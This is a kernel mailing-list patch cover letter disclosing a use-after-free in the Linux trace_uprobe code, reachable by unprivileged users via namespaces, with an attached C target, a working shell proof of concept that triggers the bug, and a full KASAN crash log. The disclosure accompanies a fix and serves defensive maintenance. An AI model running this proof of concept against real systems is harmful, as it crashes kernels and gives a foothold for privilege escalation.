Received: from mail-qv1-f42.google.com (mail-qv1-f42.google.com [209.85.219.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5673F3EC82C
	for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 15:20:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785338412; cv=none; b=m2GbW9JPYFXCbMdJEYadDkr6LeiITUjVyymsNkHuO7w36dMWdPu2qVZ+iYDcO+Pb4Sq4+2nopgiLgzt6K13bpqoIxG1IVoT57EGvlTkYcWDRFYJ8voWbjSojj6U3Q9Cfl+jMfkpCat5yMsHe7qZfxgKGDc3MJPeewaAk5zAbnpM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785338412; c=relaxed/simple;
	bh=NyHstGmacE1j1YQ+YtogufOIyV1a73sdVmuM+OS8Mc0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=t3J9+thhALO597uft/23LBBHS3ueIdvJiLRJGJzpy+TfJXadlMg+H6J+esqcutxaCSTkdTNyqjqPpy99zka/dtSjznq5mYcgcIN8rdXZ7DN+6LxnIQzlBrERV/+v/FbHaoCAqcCS8NLl3ccA0BE+Z7wPklfVGlzRkyaBfPk6OrM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=K1xdmB5l; arc=none smtp.client-ip=209.85.219.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="K1xdmB5l"
Received: by mail-qv1-f42.google.com with SMTP id 6a1803df08f44-8ef1dc934d1so9257296d6.0
        for <linux-trace-kernel@vger.kernel.org>; Wed, 29 Jul 2026 08:20:10 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785338409; x=1785943209; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=krhmBw0BsSxcvE4oV/rZCWfBCWYWklSuqeDZ0dfRz88=;
        b=K1xdmB5lqThGn7nqFkKuufSZZzjiGKqQJSLCNazvDO7BZlKKt5YEvUeuyZqUFYSMKN
         0DksCVftgk9uBRkP3CQU+2USsY+kwe51DP3YbtHk9bjnreKikG/gbQW2qPpMvmZvOwY7
         O+Qgba4I2iUBIGg+LawdLO2pTMEnBFPnAtuN1V+fSs+5QN29ZtYNfdDgBmQKGOM5Myl4
         Ovu23TrwTHvsUumPwtaYNS9W8yoKIDM1klzZ5Nu3eL+GruYJShfuvYhX1mnJ0k7pTzDp
         QZbN1CzI24tDoPy2kFoKuNMXAKA7Bi6KTSrBY8A8ElB8HcCpWUxj3jK1FIiNBTALYCTD
         W0TQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785338409; x=1785943209;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=krhmBw0BsSxcvE4oV/rZCWfBCWYWklSuqeDZ0dfRz88=;
        b=XlfmmoUzIxxtpjPuqFTf9u572DDE7eSJseVI/GR6epOO72f0pyMYbMXRjiqX1XO1b0
         xbVPhrzsz8rX6KVM/jSkCNI5mMLGD/7Nxeua69PO6j1OY8khhiF4N3sP3BdjEqTw6Dl9
         kebSyC4aBu/rYuEZALLF6udcqTkBqwh6wmOKS9vkfv5uv/JCrE95siImR+sq9fLG8w0V
         Hm6ytWCnVeIl60MXNHiXcu5L+s57Wvbh1jF4dIHpB/JEKaCm/FBhyrTzJlVzpqvfXypO
         IOxicapZC1A3UPHkHQVI2BrR/rJN5lXHCzKYNtYLjNOfKnQ/hW6bFLmB9fiW3ZOr3Kjx
         +Ylw==
X-Forwarded-Encrypted: i=1; AHgh+RoQm/76mVHkS3JnfVhrvz4hymD8MkZjdqgJVn1/uYwLbORGcV0F/q/FYvspyKLgLgNcxIUKgFOktzS7C1A5NvhOOvE=@vger.kernel.org
X-Gm-Message-State: AOJu0Yxh2Ev+twiUr+PQU7AiVOu53+PlJ99dIPFiL4dNSIwoYPZVXXMH
	g7QAVcK2XPLD65dbFTkUTTxFs+P4lqr0B8GT3TBK3Ydk6X+3/Y1A3qGH
X-Gm-Gg: AR+sD10Xd2kDpK34PKPHmYgPgW5lO9xQPLqJXUEkUzV4APSL0ophQ5Y7ii6boNEW86W
	tHDMOxjao9D/vnb3XGXb/ybjBmcAD38DANTiQ5i0/p1y1PkSno1+NYLJBPu6a7EyNIEo+6MdcIj
	IRA34rbhO311u+gbpzabayuxjhDccTMdKqutCa7qvjD8zLWX83zQOR9wAjl7vsNNEvgn2PG+U2r
	ucxaz0TnOL03snzhVTDIhkgpZW6hh+ERHjJRfyK260QvyECpUOCVVMQDaJGKTU6ct6GH9lyMfiY
	QhubK0dLn53OtJnpzakfYm7Kxk1e11+/BPnUBYzMznkc9K1UgFoNBPjgx9lEzSacR7LfhS97gFv
	xImmMcbg+DcGmBUG6Vk9lIxc0sn1mhYfA09YCGmIhfg66zf4CaUepdyciMRuLddzib9ZkvVEkwf
	AszS4K0wcoq2ly/pNI8E5LhKZPBfQfENQpOPFopr37E06ZMl39jRcd8hgfxBHY7qXuRZCpkK/Ka
	sge
X-Received: by 2002:a05:6214:3f87:b0:8fd:6e22:6631 with SMTP id 6a1803df08f44-90822a3c50fmr27599686d6.29.1785338408802;
        Wed, 29 Jul 2026 08:20:08 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-9081dc4286dsm26812166d6.7.2026.07.29.08.20.03
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 08:20:08 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-kernel@vger.kernel.org,
	linux-trace-kernel@vger.kernel.org
Cc: rostedt@goodmis.org,
	mhiramat@kernel.org,
	mathieu.desnoyers@efficios.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] kernel/trace: Fix use-after-free in unregister_trace_uprobe()
Date: Wed, 29 Jul 2026 23:19:58 +0800
Message-ID: <cover.1785227724.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: linux-trace-kernel@vger.kernel.org
List-Id: <linux-trace-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-trace-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-trace-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in kernel/trace/trace_uprobe.c. The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

When unregistering a trace_uprobe in unregister_trace_uprobe(), if the target
probe has sibling probes attached to the same dynamic event, trace_probe_has_sibling()
returns true. In this case, unregister_trace_uprobe() skips the dynamic event busy
check (trace_event_dyn_busy()) and directly executes dyn_event_remove(),
trace_probe_unlink(), and free_trace_uprobe().

However, unregister_trace_uprobe() fails to check whether the specific trace_uprobe
itself is currently enabled (i.e. trace_probe_is_enabled()). If an enabled
trace_uprobe is unregistered, its underlying structure is freed while active
uprobe consumers remain registered. Subsequent or concurrent uprobe events will still
trigger uprobe_dispatcher(), which attempts to access the already freed trace_uprobe
object, leading to a Use-After-Free (UAF) condition that can corrupt memory or
crash the kernel.

Root Cause:
Missing trace_probe_is_enabled() check before unlinking and freeing the trace_uprobe
structure when handling sibling probes.

Reproducer:

    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#include <unistd.h>

__attribute__((noinline)) int victim(int x)
{
    return x + 1;
}

int main(void)
{
    volatile int x = 0;

    while (1) {
        x = victim(x);
        if (x > 1000000)
            x = 0;
    }

    return 0;
}

------END poc.c--------

------BEGIN poc.sh------

#!/bin/bash
set -euxo pipefail

if [ "$(id -u)" -ne 0 ]; then
    echo "run as root" >&2
    exit 1
fi

SCRIPT_DIR=$(cd -- "$(dirname -- "$0")" && pwd)
BIN=/tmp/u4a_target

if [ -d /sys/kernel/tracing ]; then
    TRACEFS=/sys/kernel/tracing
else
    TRACEFS=/sys/kernel/debug/tracing
fi

# Build a hot loop target and find the file offset for victim().
gcc -O0 -g -fno-omit-frame-pointer -o "$BIN" "$SCRIPT_DIR/poc.c"
OFF=$(nm "$BIN" | awk '/ victim$/{print "0x"$1; exit}')
if [ -z "$OFF" ]; then
    echo "failed to resolve victim offset" >&2
    exit 1
fi

cd "$TRACEFS"
echo 0 > tracing_on || true
echo > uprobe_events || true

# Create two sibling uprobes under one event name.
echo "p:u4a_grp/u4a_evt $BIN:$OFF arg1=%ip" > uprobe_events
echo "p:u4a_grp/u4a_evt $BIN:$OFF arg1=\$stack" >> uprobe_events

# Keep event active, then remove siblings by event name.
echo 1 > events/u4a_grp/u4a_evt/enable
"$BIN" >/dev/null 2>&1 &
TARGET_PID=$!
sleep 1
echo "-:u4a_grp/u4a_evt" >> uprobe_events || true

# Expect kernel panic / KASAN splat shortly after this point.
sleep 10

echo "target pid=$TARGET_PID still alive; crash did not trigger in this run" >&2
exit 1

------END poc.sh--------

----BEGIN crash log----

[  196.380209][ T9269] =========================================================
./poc.sh: line 3[  196.381493][ T9269] BUG: KASAN: slab-use-after-free in handl0
[  196.383421][ T9269] Read of size 8 at addr ffff888034697c18 by task u4a_targ9
[  196.384283][ T9269] 
[  196.410300][ T9269] CPU: 1 UID: 0 PID: 9269 Comm: u4a_target Not tainted 7.0 
[  196.410317][ T9269] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  196.410348][ T9269] Call Trace:
[  196.410371][ T9269]  <TASK>
[  196.410374][ T9269]  dump_stack_lvl+0x10e/0x1f0
[  196.411147][ T9269]  print_report+0xf7/0x600
[  196.411178][ T9269]  ? preempt_count_sub+0x13/0xd0
[  196.411223][ T9269]  ? __virt_addr_valid+0x1ab/0x330
[  196.411274][ T9269]  ? __phys_addr+0x41/0x90
[  196.411283][ T9269]  ? handler_chain+0x211/0xd90
[  196.411297][ T9269]  kasan_report+0xe4/0x120
[  196.411305][ T9269]  ? handler_chain+0x211/0xd90
[  196.411315][ T9269]  handler_chain+0x211/0xd90
[  196.411378][ T9269]  ? __pfx_find_active_uprobe_rcu+0x10/0x10
[  196.411388][ T9269]  ? _copy_to_user+0x48/0xd0
[  196.411454][ T9269]  ? __pfx_handler_chain+0x10/0x10
[  196.411464][ T9269]  ? emulate_push_stack+0xfd/0x160
[  196.411495][ T9269]  ? __pfx_emulate_push_stack+0x10/0x10
[  196.411520][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.411586][ T9269]  ? lock_acquire+0x303/0x360
[  196.411601][ T9269]  ? uprobe_notify_resume+0x406/0xa70
[  196.411622][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.411631][ T9269]  ? uprobe_pre_sstep_notifier+0xbc/0xe0
[  196.411642][ T9269]  uprobe_notify_resume+0x420/0xa70
[  196.411653][ T9269]  ? __pfx_uprobe_notify_resume+0x10/0x10
[  196.411662][ T9269]  ? notify_die+0xc7/0x1a0
[  196.411687][ T9269]  ? __pfx_notify_die+0x10/0x10
[  196.411696][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.411705][ T9269]  exit_to_user_mode_loop+0x7c/0x560
[  196.411723][ T9269]  exc_int3+0x2f5/0x3d0
[  196.411745][ T9269]  asm_exc_int3+0x39/0x40
[  196.411771][ T9269] RIP: 0033:0x562b2c30a125
[  196.411795][ T9269] Code: 2f 00 00 e8 2d ff ff ff e8 68 ff ff ff c6 05 19 2fc
[  196.411801][ T9269] RSP: 002b:00007fff88b86b38 EFLAGS: 00000287
[  196.411817][ T9269] RAX: 00000000000808b1 RBX: 0000000000000000 RCX: 00007f28
[  196.411821][ T9269] RDX: 00007fff88b86c58 RSI: 00007fff88b86c48 RDI: 00000001
[  196.411825][ T9269] RBP: 00007fff88b86b50 R08: 0000000000000000 R09: 00007f20
[  196.411829][ T9269] R10: 0000000000000000 R11: 0000000000000002 R12: 00005620
[  196.411833][ T9269] R13: 0000000000000000 R14: 0000000000000000 R15: 00000000
[  196.411838][ T9269]  </TASK>
[  196.411841][ T9269] 
[  196.435201][ T9269] Allocated by task 9257:
[  196.435604][ T9269]  kasan_save_stack+0x33/0x60
[  196.436083][ T9269]  kasan_save_track+0x14/0x30
[  196.436504][ T9269]  __kasan_kmalloc+0xaa/0xb0
[  196.436911][ T9269]  __kmalloc_noprof+0x319/0x820
[  196.437339][ T9269]  alloc_trace_uprobe+0x8a/0x230
[  196.437948][ T9269]  __trace_uprobe_create+0x50e/0x14c0
[  196.438472][ T9269]  trace_probe_create+0xef/0x100
[  196.438935][ T9269]  dyn_event_create+0x34/0x50
[  196.439376][ T9269]  create_or_delete_trace_uprobe+0x3f/0x90
[  196.440071][ T9269]  trace_parse_run_command+0x136/0x340
[  196.440544][ T9269]  vfs_write+0x242/0xad0
[  196.440981][ T9269]  ksys_write+0x103/0x1f0
[  196.441340][ T9269]  do_syscall_64+0x116/0x800
[  196.441957][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  196.442475][ T9269] 
[  196.442688][ T9269] Freed by task 9257:
[  196.443024][ T9269]  kasan_save_stack+0x33/0x60
[  196.443428][ T9269]  kasan_save_track+0x14/0x30
[  196.443837][ T9269]  kasan_save_free_info+0x3b/0x60
[  196.444452][ T9269]  __kasan_slab_free+0x5f/0x80
[  196.444851][ T9269]  kfree+0x2e2/0x6c0
[  196.445175][ T9269]  trace_uprobe_release+0x16f/0x220
[  196.445607][ T9269]  dyn_event_release+0x241/0x380
[  196.446081][ T9269]  create_or_delete_trace_uprobe+0x74/0x90
[  196.446690][ T9269]  trace_parse_run_command+0x136/0x340
[  196.447165][ T9269]  vfs_write+0x242/0xad0
[  196.447546][ T9269]  ksys_write+0x103/0x1f0
[  196.448022][ T9269]  do_syscall_64+0x116/0x800
[  196.448452][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  196.448976][ T9269] 
[  196.449179][ T9269] The buggy address belongs to the object at ffff8880346970
[  196.449179][ T9269]  which belongs to the cache kmalloc-256 of size 256
[  196.450363][ T9269] The buggy address is located 24 bytes inside of
[  196.450363][ T9269]  freed 256-byte region [ffff888034697c00, ffff888034697d)
[  196.451485][ T9269] 
[  196.451779][ T9269] The buggy address belongs to the physical page:
[  196.452511][ T9269] page: refcount:0 mapcount:0 mapping:0000000000000000 ind6
[  196.453494][ T9269] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapp0
[  196.454289][ T9269] flags: 0xfff00000000240(workingset|head|node=0|zone=1|la)
[  196.455051][ T9269] page_type: f5(slab)
[  196.455599][ T9269] raw: 00fff00000000240 ffff888017841b40 ffffea0001280610 0
[  196.456365][ T9269] raw: ffff888034697e00 000000080010000c 00000000f5000000 0
[  196.457411][ T9269] head: 00fff00000000240 ffff888017841b40 ffffea00012806100
[  196.458155][ T9269] head: ffff888034697e00 000000080010000c 00000000f50000000
[  196.458907][ T9269] head: 00fff00000000001 ffffffffffffff81 00000000fffffffff
[  196.459818][ T9269] head: ffffffffffffffff 0000000000000000 00000000ffffffff2
[  196.460634][ T9269] page dumped because: kasan: bad access detected
[  196.461219][ T9269] page_owner tracks the page as allocated
[  196.461786][ T9269] page last allocated via order 1, migratetype Unmovable, 0
[  196.463981][ T9269]  post_alloc_hook+0xe6/0x100
[  196.464422][ T9269]  get_page_from_freelist+0x55c/0x2210
[  196.464900][ T9269]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[  196.465499][ T9269]  new_slab+0xa2/0x5f0
[  196.465860][ T9269]  refill_objects+0xe3/0x430
[  196.466251][ T9269]  __pcs_replace_empty_main+0x2ed/0x650
[  196.466711][ T9269]  __kmalloc_cache_noprof+0x576/0x6e0
[  196.467281][ T9269]  inode_doinit_use_xattr+0x42/0x2e0
[  196.467824][ T9269]  inode_doinit_with_dentry+0x9a6/0x9d0
[  196.468314][ T9269]  selinux_d_instantiate+0x26/0x30
[  196.468737][ T9269]  security_d_instantiate+0x142/0x180
[  196.469330][ T9269]  d_splice_alias_ops+0x7c/0x680
[  196.469792][ T9269]  kernfs_iop_lookup+0x16a/0x1a0
[  196.470333][ T9269]  path_openat+0x17b0/0x27b0
[  196.470815][ T9269]  do_file_open+0x1b1/0x2f0
[  196.471420][ T9269]  do_sys_openat2+0xf7/0x1b0
[  196.471868][ T9269] page last free pid 4982 tgid 4982 stack trace:
[  196.472760][ T9269]  __free_frozen_pages+0x52d/0x960
[  196.473191][ T9269]  pgd_free+0x277/0x2e0
[  196.473605][ T9269]  __mmdrop+0xd1/0x380
[  196.473962][ T9269]  __mmput+0x26d/0x270
[  196.474381][ T9269]  mmput+0x62/0x70
[  196.474762][ T9269]  setup_new_exec+0x131/0x170
[  196.475271][ T9269]  load_elf_binary+0x78f/0x3400
[  196.475716][ T9269]  bprm_execve+0x68f/0xfb0
[  196.476088][ T9269]  do_execveat_common.isra.0+0x2ef/0x360
[  196.476644][ T9269]  __x64_sys_execve+0x5d/0x80
[  196.477152][ T9269]  do_syscall_64+0x116/0x800
[  196.477707][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  196.478260][ T9269] 
[  196.478500][ T9269] Memory state around the buggy address:
[  196.479110][ T9269]  ffff888034697b00: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  196.480054][ T9269]  ffff888034697b80: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  196.481482][ T9269] >ffff888034697c00: fa fb fb fb fb fb fb fb fb fb fb fb fb
[  196.482277][ T9269]                             ^
[  196.483019][ T9269]  ffff888034697c80: fb fb fb fb fb fb fb fb fb fb fb fb fb
[  196.483936][ T9269]  ffff888034697d00: fc fc fc fc fc fc fc fc fc fc fc fc fc
[  196.484720][ T9269] =========================================================
[  196.487203][ T9269] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  196.488061][ T9269] CPU: 1 UID: 0 PID: 9269 Comm: u4a_target Not tainted 7.0 
[  196.489283][ T9269] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  196.490632][ T9269] Call Trace:
[  196.490978][ T9269]  <TASK>
[  196.491419][ T9269]  dump_stack_lvl+0x3b/0x1f0
[  196.491991][ T9269]  vpanic+0x8b4/0x930
[  196.492414][ T9269]  ? __pfx_vpanic+0x10/0x10
[  196.492865][ T9269]  ? handler_chain+0x211/0xd90
[  196.493446][ T9269]  panic+0xca/0xd0
[  196.493917][ T9269]  ? __pfx_panic+0x10/0x10
[  196.494538][ T9269]  ? handler_chain+0x211/0xd90
[  196.495034][ T9269]  ? preempt_schedule_thunk+0x16/0x40
[  196.495658][ T9269]  ? preempt_schedule_common+0x3b/0x80
[  196.496407][ T9269]  ? preempt_schedule_thunk+0x16/0x40
[  196.497011][ T9269]  ? check_panic_on_warn+0x1f/0xb0
[  196.497529][ T9269]  check_panic_on_warn+0xab/0xb0
[  196.498031][ T9269]  end_report+0x132/0x180
[  196.498438][ T9269]  kasan_report+0xf4/0x120
[  196.498942][ T9269]  ? handler_chain+0x211/0xd90
[  196.499460][ T9269]  handler_chain+0x211/0xd90
[  196.499916][ T9269]  ? __pfx_find_active_uprobe_rcu+0x10/0x10
[  196.500500][ T9269]  ? _copy_to_user+0x48/0xd0
[  196.500978][ T9269]  ? __pfx_handler_chain+0x10/0x10
[  196.501508][ T9269]  ? emulate_push_stack+0xfd/0x160
[  196.502006][ T9269]  ? __pfx_emulate_push_stack+0x10/0x10
[  196.502542][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.503067][ T9269]  ? lock_acquire+0x303/0x360
[  196.503523][ T9269]  ? uprobe_notify_resume+0x406/0xa70
[  196.504144][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.504686][ T9269]  ? uprobe_pre_sstep_notifier+0xbc/0xe0
[  196.505228][ T9269]  uprobe_notify_resume+0x420/0xa70
[  196.505748][ T9269]  ? __pfx_uprobe_notify_resume+0x10/0x10
[  196.506363][ T9269]  ? notify_die+0xc7/0x1a0
[  196.506815][ T9269]  ? __pfx_notify_die+0x10/0x10
[  196.507293][ T9269]  ? rcu_is_watching+0x3d/0x80
[  196.507796][ T9269]  exit_to_user_mode_loop+0x7c/0x560
[  196.508436][ T9269]  exc_int3+0x2f5/0x3d0
[  196.508922][ T9269]  asm_exc_int3+0x39/0x40
[  196.509382][ T9269] RIP: 0033:0x562b2c30a125
[  196.509872][ T9269] Code: 2f 00 00 e8 2d ff ff ff e8 68 ff ff ff c6 05 19 2fc
[  196.511725][ T9269] RSP: 002b:00007fff88b86b38 EFLAGS: 00000287
[  196.512366][ T9269] RAX: 00000000000808b1 RBX: 0000000000000000 RCX: 00007f28
[  196.513212][ T9269] RDX: 00007fff88b86c58 RSI: 00007fff88b86c48 RDI: 00000001
[  196.513986][ T9269] RBP: 00007fff88b86b50 R08: 0000000000000000 R09: 00007f20
[  196.514742][ T9269] R10: 0000000000000000 R11: 0000000000000002 R12: 00005620
[  196.515546][ T9269] R13: 0000000000000000 R14: 0000000000000000 R15: 00000000
[  196.516410][ T9269]  </TASK>
[  196.517369][ T9269] Kernel Offset: disabled
[  196.517836][ T9269] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Luxiao Xu & Ren Wei

Luxiao Xu (1):
  tracing/uprobes: Reject unregistering enabled trace_uprobe to prevent
    UAF

 kernel/trace/trace_uprobe.c | 3 +++
 1 file changed, 3 insertions(+)

-- 
2.43.0

